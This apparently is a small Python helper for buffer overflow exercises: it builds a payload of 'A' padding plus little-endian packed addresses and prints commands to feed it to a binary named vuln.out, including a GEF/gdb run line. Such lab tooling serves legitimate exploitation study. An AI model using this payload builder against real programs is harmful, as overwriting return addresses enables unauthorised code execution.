#!/usr/bin/env python3
import sys


def to_le_bytes(addr_str: str) -> bytes:
    addr = int(addr_str, 16)
    return addr.to_bytes(4, byteorder="little")


def is_hex_arg(arg: str) -> bool:
    return arg.lower().startswith("0x")


def encode_arg(arg: str) -> bytes:
    if is_hex_arg(arg):
        return to_le_bytes(arg)
    return arg.encode()


def main():
    if len(sys.argv) < 3:
        print(__doc__)
        sys.exit(1)

    try:
        offset = int(sys.argv[1])
    except ValueError:
        print(f"Invalid padding length: {sys.argv[1]!r}")
        print(__doc__)
        sys.exit(1)

    args = sys.argv[2:]

    payload = b"A" * offset
    for arg in args:
        payload += encode_arg(arg)

    print(f"Offset (padding bytes): {offset}")
    print(f"Total payload length:   {len(payload)} bytes")
    print()
    print("Run this to start:")
    print()
    payload_parts = [f'b"A"*{offset}']
    for arg in args:
        encoded_arg = encode_arg(arg)
        if is_hex_arg(arg):
            payload_parts.append(f"bytes.fromhex({encoded_arg.hex()!r})")
        else:
            payload_parts.append(repr(encoded_arg))
    payload_expression = " + ".join(payload_parts)
    print("python3 -c \"import subprocess; subprocess.run(['./vuln.out', "
            f"{payload_expression}])\"")
    print()
    print("Run this at the GEF prompt to inspect the payload (hex, handles NUL bytes):")
    gdb_command = (
        "run $(python3 -c 'import sys; "
        f"sys.stdout.buffer.write({payload_expression})"
        "')"
    )
    print(gdb_command)
    print()
    print("Standalone Python command:")
    standalone_parts = [f"'A'*{offset}"]
    for arg in args:
        encoded_arg = encode_arg(arg)
        if is_hex_arg(arg):
            escaped_arg = "".join(f"\\x{byte:02x}" for byte in encoded_arg)
        else:
            escaped_arg = "".join(
                chr(byte) if 0x20 <= byte <= 0x7e and byte not in (0x27, 0x5c)
                else "\\'" if byte == 0x27
                else "\\\\" if byte == 0x5c
                else f"\\x{byte:02x}"
                for byte in encoded_arg
            )
        standalone_parts.append(f"'{escaped_arg}'")
    standalone_expression = " + ".join(standalone_parts)
    print(f'$(python3 -c "print({standalone_expression})")')


if __name__ == "__main__":
    main()
